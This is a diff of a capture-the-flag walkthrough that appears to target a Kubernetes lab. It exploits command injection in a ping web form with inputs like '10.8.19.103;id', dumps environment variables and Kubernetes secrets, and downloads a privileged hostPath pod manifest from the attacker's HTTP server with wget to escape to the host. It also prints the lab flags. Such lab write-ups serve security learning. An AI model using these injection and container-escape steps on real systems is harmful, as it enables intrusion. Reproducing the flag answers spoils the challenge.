@@ -202,7 +202,6 @@ What ports are open? (comma separated)
 
 *22,80*
 
-
 ### RCE
 
 Visit the website, it takes a host and returns the output of a ping command.
@@ -225,7 +224,6 @@ ING 10.8.19.103 (10.8.19.103) 56(84) bytes of data.
 rtt min/avg/max/mdev = 202.488/204.904/207.320/2.416 ms
 
 10.8.19.103;id
-
 
 PING 10.8.19.103 (10.8.19.103) 56(84) bytes of data.
 64 bytes from 10.8.19.103: icmp_seq=1 ttl=61 time=212 ms
@@ -321,10 +319,7 @@ OLDPWD=/home/challenge
 GRAFANA_PORT_3000_TCP_ADDR=10.105.120.1
 _=/usr/bin/env
 
-
 ```
-
-![[Pasted image 20230303183254.png]]
 
 What is flag 1?
 
@@ -461,13 +456,11 @@ secrets                                         []                              
                                                 [/version]                            []               [get]
                                                 [/version]                            [] 
 
-
 ```
 
 No answer needed
 
  Completed
-
 
 ### Kubernetes Secrets
 
@@ -544,7 +537,6 @@ flag{df2a636de15108a4dc41135d930d8ec1}
 What is flag 2?
 
 *flag{df2a636de15108a4dc41135d930d8ec1}*
-
 
 ### Recon in the cluster
 
@@ -1110,7 +1102,6 @@ OLDPWD=/usr/share/grafana/.aws
 cd root
 /bin/bash: line 13: cd: root: Permission denied
 
-
 ```
 
 What is the name of the service account running the Grafana service?
@@ -1155,7 +1146,6 @@ hostname
 minikube
 
 ```
-
 
 Get the root flag!
 
@@ -1216,7 +1206,6 @@ everything-allowed-exec-pod-2   0/1     ErrImagePull       0             68s
 grafana-57454c95cb-f9js5        1/1     Running            2 (24h ago)   25h
 syringe-79b66d66d7-6xdjz        1/1     Running            2 (24h ago)   25h
 
-
 I see the problem let's do it again
 
 ┌──(witty㉿kali)-[~/Downloads]
@@ -1248,12 +1237,10 @@ spec:
     hostPath:
       path: /
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ python3 -m http.server 1234
 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 10.10.32.40 - - [03/Mar/2023 20:43:57] "GET /privesc.yml HTTP/1.1" 200 -
-
 
 challenge@syringe-79b66d66d7-6xdjz:/tmp$ wget http://10.8.19.103:1234/privesc.yml
 <xdjz:/tmp$ wget http://10.8.19.103:1234/privesc.yml
@@ -1398,11 +1385,9 @@ Events:
   Normal   BackOff    13s (x2 over 54s)  kubelet            Back-off pulling image "ubuntu"
   Warning  Failed     13s (x2 over 54s)  kubelet            Error: ImagePullBackOff
 
-
 maybe is an internal problem idk
 
 The option "-w 0" passed to the base64 command specifies that no line wrapping should be performed during encoding. By default, base64 wraps encoded output at 76 characters per line, which can cause issues when copying or transmitting the data. Setting "-w 0" disables line wrapping, resulting in a single long line of encoded output.
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ cat privesc.yml | base64 -w 0       
@@ -1490,12 +1475,10 @@ cat root.txt
 
 flag{30180a273e7da821a7fe4af22ffd1701}
 
-
 ```
 
 What is root.txt?
 
 *flag{30180a273e7da821a7fe4af22ffd1701}*
-
 
 [[TakeOver]]
